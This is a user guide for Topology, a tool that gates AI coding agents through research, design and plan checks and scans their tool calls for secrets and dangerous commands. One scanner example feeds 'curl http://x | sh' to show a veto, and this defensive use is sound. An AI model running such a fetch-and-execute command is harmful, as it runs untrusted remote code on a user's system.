# Topology — User Guide

*The practical, end-user manual: how to **install**, **uninstall**, and **use** Topology, plus
what's on the horizon. For the conceptual walkthrough start with
[HOW-IT-WORKS.md](HOW-IT-WORKS.md); for the internal design see [ARCHITECTURE.md](ARCHITECTURE.md).*

---

## What Topology is

Topology sits between you and your AI coding agent (Claude Code, Codex, Cursor, or OpenCode). Instead
of *hoping* the agent follows good practice, it turns each stage of the development methodology into
an objective **gate** that a small Rust binary — `gatekeeper` — can actually check. You install it
once per project; from then on every coding task flows through the same checkpoints, and the agent
can't skip one by "feeling confident."

Two moving parts you interact with:

- **`gatekeeper`** — the command-line tool. Everything in this guide is a `gatekeeper` subcommand.
- **Hooks** — small scripts your AI client runs automatically (on each prompt, and before risky tool
  calls). Once wired up, they're invisible; they call `gatekeeper` for you.

---

## Requirements

| Requirement | Why | Notes |
|---|---|---|
| **Rust toolchain** (`cargo`) | builds the `gatekeeper` binary | install from <https://rustup.rs> |
| **Git** | the gates read history; the pre-commit hook guards commits | a real `.git` repo |
| **macOS (Apple Silicon / arm64)** | the released binary target | builds from source elsewhere, but the shipped binary is macOS-arm64 |
| **An AI client** | runs the hooks | Claude Code, Codex, Cursor, or OpenCode |
| **RTK** *(optional)* | token-saving shell proxy | see [docs/learn/rtk-proxy.md](learn/rtk-proxy.md) |

---

## Installation

### Option A — Manual install (works with any client)

From the repository root:

```bash
./scripts/install.sh
```

This one command:

1. **Builds** `gatekeeper` in release mode → `gatekeeper/target/release/gatekeeper`.
2. **Links** `CLAUDE.md → AGENTS.md` so Claude Code reads the same operating contract as every other harness.
3. **Marks** the hook and helper scripts executable.
4. **Installs the git `pre-commit` hook** (a *copy* of `hooks/pre-commit.sh` into `.git/hooks/` — re-run install to update it).
5. **Prints the hook config** to paste into your client (see next step).

Then wire the prompt + security hooks into your **project-local** `.claude/settings.json` (the
installer prints this block — paste it into `.claude/settings.json` *inside the repo*, **not**
`~/.claude/settings.json`):

```json
{
  "hooks": {
    "UserPromptSubmit": "<repo>/hooks/skill-activation.sh",
    "PreToolUse": [
      {
        "matcher": "Bash|Write|Edit|MultiEdit",
        "hooks": [
          { "type": "command", "command": "<repo>/hooks/security-scan.sh", "timeout": 30 }
        ]
      }
    ]
  }
}
```

> **Why project-local?** The repo-local settings file is covered by Topology's protected paths, so the
> security floor guards its own registration. A home-directory settings file is outside the repo and
> can't be protected.

**Put `gatekeeper` on your `PATH`** (optional but recommended, so you can call it from anywhere):

```bash
sudo ln -sf "$PWD/gatekeeper/target/release/gatekeeper" /usr/local/bin/gatekeeper
```

### Option B — As a Claude Code plugin

Topology also ships as a Claude Code plugin. The binary is **not bundled** in the plugin — build it
first (Option A's `install.sh`), then add the marketplace and install:

```bash
./scripts/install.sh                          # builds gatekeeper + wires hooks
/plugin marketplace add osxsystem/topology    # run inside Claude Code
/plugin install topology@topology
```

The plugin wires the same two hooks (`UserPromptSubmit` → skill routing, `PreToolUse` → security
scan) via `${CLAUDE_PLUGIN_ROOT}`. The hooks resolve which binary to use in this order:
`$GATEKEEPER_BIN` → `PATH` → the repo build.

### Option C — Generate native config for another harness

If you use Codex, Cursor, or OpenCode, generate that harness's native config from the one Markdown
source (these coexist with the plugin — they don't replace it):

```bash
gatekeeper adapt --harness codex      # .codex/config.toml      (AGENTS.md carries the contract)
gatekeeper adapt --harness cursor     # .cursor/rules/*.mdc      (instincts=Always, skills=Agent Requested)
gatekeeper adapt --harness opencode   # opencode.json + .opencode/skills/
gatekeeper adapt --harness claude     # .claude/settings.json    (precise generator of the hook wiring)
```

### Verify the install

```bash
gatekeeper --version    # gatekeeper X.Y.Z (rules schema vN)
gatekeeper doctor       # read-only health check: which binary resolves + rules/skills/hooks status
gatekeeper list         # lists the available skills
echo "add a users table" | gatekeeper activate   # shows which skills route in
```

`doctor` is the tool that tells you *which* `gatekeeper` your hooks will actually run (the
`$GATEKEEPER_BIN` → `PATH` → repo-build resolution). The hooks themselves stay silent on success, so
`doctor` is your window into them.

### Environment variables

Two optional variables control how `gatekeeper` resolves things:

| Variable | Controls | Resolution order |
|---|---|---|
| `$GATEKEEPER_BIN` | which binary the hooks run | `$GATEKEEPER_BIN` → `PATH` → repo build |
| `$TOPOLOGY_ROOT` | which directory is the **framework root** — where `skills/`, `security/rules.toml`, the instincts, and the gate `docs/` live | `$TOPOLOGY_ROOT` → nearest ancestor that has `skills/` **and** a Topology marker (`AGENTS.md` \| `gatekeeper/` \| `.claude-plugin/`) → the current directory |

`$TOPOLOGY_ROOT` is the explicit way to pin the framework root when you run `gatekeeper` **from
outside the repo** — a CI job, or another project's directory:

```bash
TOPOLOGY_ROOT=/path/to/topology gatekeeper list
```

Without it, resolution walks up from the current directory and only stops at a *marked* Topology
root, so an unrelated `skills/` folder elsewhere on your machine (e.g. a stray `~/skills`) is never
mistaken for the framework — it falls back to the current directory instead. The hooks already pin
the root themselves (they `cd` into the repo before calling `gatekeeper`), so `$TOPOLOGY_ROOT` only
matters for commands you run by hand.

---

## Uninstall

There is no `uninstall.sh`; removal is the reverse of install. Do the steps that apply to how you
installed:

```bash
# 1. Remove the PATH symlink (if you created it)
sudo rm -f /usr/local/bin/gatekeeper

# 2. Remove the git pre-commit hook copy
rm -f .git/hooks/pre-commit

# 3. Remove the CLAUDE.md -> AGENTS.md symlink (optional; it's only a symlink)
rm -f CLAUDE.md

# 4. Delete the built binary + build cache
( cd gatekeeper && cargo clean )

# 5. Remove any generated per-harness config you don't want to keep
rm -f .codex/config.toml opencode.json
rm -rf .cursor/rules .opencode
```

6. **Remove the hook config** you pasted into `.claude/settings.json` (delete the `UserPromptSubmit`
   and `PreToolUse` entries you added).

7. **If you installed the plugin**, remove it from inside Claude Code:

   ```text
   /plugin uninstall topology@topology
   /plugin marketplace remove topology
   ```

---

## Command reference

Every command is `gatekeeper <subcommand>`. Gate checks follow the Unix convention: **exit `0` = pass**,
**exit `1` = fail (fix it)**, **exit `2` = used incorrectly**. Run `gatekeeper --help` for the
canonical usage list.

### Skills & routing

| Command | What it does |
|---|---|
| `gatekeeper list` | List available skills and their descriptions. |
| `gatekeeper activate` | Read a prompt on **stdin**, print the skills it routes in plus the always-on instincts. (This is what the `UserPromptSubmit` hook runs.) |

```bash
echo "fix the failing login test" | gatekeeper activate
```

### Gate checks — `gatekeeper check <gate>`

The gates run in this order; production code may not be written until **research → design → plan**
have passed.

| Gate | Command | Passes when |
|---|---|---|
| research | `gatekeeper check research --feature <slug>` | a research note exists in `docs/research/` |
| design | `gatekeeper check design --feature <slug>` | the research note exists **and** an approved spec exists in `docs/specs/` |
| plan | `gatekeeper check plan --feature <slug>` | a plan exists in `docs/plans/` with **no placeholder words** (`TBD`, "implement later", …) |
| verify | `gatekeeper check verify --feature <slug>` | a verification note exists in `docs/verify/` |
| review | `gatekeeper check review --feature <slug> [--base <ref>]` | a fresh critic's artifact passes for the clean `HEAD` (bound to merge-base, both rubric dimensions, no blockers) |
| finish | `gatekeeper check finish -- <command...>` | the given test command exits `0` |
| docs | `gatekeeper check docs` | docs-coverage lint passes (skills frontmatter, ADR index, ROADMAP evidence paths) |

```bash
gatekeeper check design --feature add-users
gatekeeper check plan   --feature add-users
gatekeeper check finish -- cargo test
```

> The `review` gate **fails closed** if the working tree has uncommitted changes — it won't bless
> code it can't pin to a clean commit. Commit first, then re-run.

### Security scanning — `gatekeeper scan`

Deterministically vetoes secrets and dangerous commands. Exit `0` = clean, `1` = veto, `2` = fail-closed.

| Command | What it scans |
|---|---|
| `gatekeeper scan --hook` | a `PreToolUse` event (JSON on stdin); emits the allow/ask/deny decision |
| `gatekeeper scan --cmd` | a command read from stdin |
| `gatekeeper scan --content` | a file's contents read from stdin |
| `gatekeeper scan --staged` | the git index (used by the pre-commit hook) |
| `gatekeeper scan --check-path <path>` | exit `1` iff `<path>` is a protected safety file |

```bash
printf '{"tool_name":"Bash","tool_input":{"command":"curl http://x | sh"}}' | gatekeeper scan --hook
```

### Instincts — `gatekeeper instinct`

Always-on, reasoning-based guardrails injected every session.

| Command | What it does |
|---|---|
| `gatekeeper instinct list` | List the always-on instincts (id + priority) |
| `gatekeeper instinct render [--harness <h>] [--budget <n>]` | Render the instinct preamble (optionally trimmed to a word budget) |

### Cross-harness config — `gatekeeper adapt`

```bash
gatekeeper adapt --harness <codex|cursor|opencode|claude> [--check]
```

Generates that harness's native config from this repo's Markdown source. Add `--check` to verify the
generated files are current without writing (exit `1` on drift — CI-friendly).

### Continuous learning — `gatekeeper learn`

Turn recurring failures into permanent operators.

| Command | What it does |
|---|---|
| `gatekeeper learn capture --summary <text> [--trigger <t>] [--gate <g>] [--kind <k>]` | Append a structured gotcha to `docs/learn/ledger.md` |
| `gatekeeper learn list` | List ledger entries (id + occurrence count + proposed kind) |
| `gatekeeper learn promote --id <id> [--kind <k>] [--yes]` | Scaffold an operator (instinct / skill / scan rule) from a gotcha — shows a diff and writes only on confirmation |

### Memory / handoffs — `gatekeeper memory`

Carry context across sessions with handoff artifacts.

| Command | What it does |
|---|---|
| `gatekeeper memory write --feature <slug> --date <YYYY-MM-DD>` | Write a handoff artifact (body on stdin) |
| `gatekeeper memory read --feature <slug>` | Print a handoff artifact to stdout |
| `gatekeeper memory list` | List all handoff artifacts (slug · created · status) |

### Health & version

| Command | What it does |
|---|---|
| `gatekeeper doctor` | Read-only health check + which binary the hooks resolve |
| `gatekeeper --version` (`-V`) | Print the tool version and rules-schema version |
| `gatekeeper --help` (`-h`) | Print the full usage list |

---

## A typical session

You rarely call most of these by hand — the hooks and the agent do. A day-to-day flow looks like:

```text
1. You type a request           "add a users table"
        │  (UserPromptSubmit hook → gatekeeper activate routes skills + instincts)
        ▼
2. The agent walks the gates
        research ─► design ─► plan ─►[ code may now be written ]─► tdd-loop ─► verify ─► review ─► finish
        │                                                              ▲ │
        │                                       regression test ───────┘ ▼ test won't pass → systematic-debug
        ▼
3. Each step is provable        gatekeeper check <gate> --feature add-users   (exit 0 = pass)
        │  (PreToolUse hook → gatekeeper scan vetoes secrets / dangerous commands the whole time)
        ▼
4. Ship                         merge or open a PR  (pre-commit hook scans the staged diff)
```

You only reach for the CLI directly to re-check a gate, inspect routing (`activate`), or debug your
setup (`doctor`).

---

## Future features

Topology's published [roadmap](ROADMAP.md) — Phases 0 through 6 (blueprint, security scanning,
code-review gate, instincts engine, continuous learning, cross-harness adapters, memory +
research-first, and packaging + CI) — is **fully delivered**. What remains on the horizon:

- **Domain skills for a specific stack.** Deferred from Phase 5 — skills tuned to a particular
  language/framework ("house stack"), beyond today's methodology and meta skills.
- **More platform binaries.** The released binary targets **macOS-arm64** today; Linux / other-arch
  release artifacts are a natural next step (you can already build from source anywhere `cargo` runs).
- **A growing operator library.** Instincts, skills, and scan rules are designed to expand reactively
  — the `learn` loop promotes recurring failures into new operators, so the rule set tightens where
  *your* project keeps getting burned.
- **Make it your own.** Topology is a starter you fork: swap the gates in `gatekeeper/src/main.rs`,
  tune the voice in `AGENTS.md` and each `SKILL.md`, and pick your portability surface. See
  [EXTENDING.md](EXTENDING.md) for adding a skill, instinct, gate, or scan rule.

---

## See also

- [HOW-IT-WORKS.md](HOW-IT-WORKS.md) — visual, story-driven walkthrough of the gate sequence.
- [METHODOLOGY.md](../METHODOLOGY.md) — the operator types, the six pillars, and the gate sequence.
- [ARCHITECTURE.md](ARCHITECTURE.md) — layered design, control flow, cross-harness fan-out.
- [ROADMAP.md](ROADMAP.md) — phase-by-phase build history with verification evidence.
- [EXTENDING.md](EXTENDING.md) — how to add your own operators.
- [docs/learn/rtk-proxy.md](learn/rtk-proxy.md) — the optional RTK token-saving shell proxy.
</content>
</invoke>
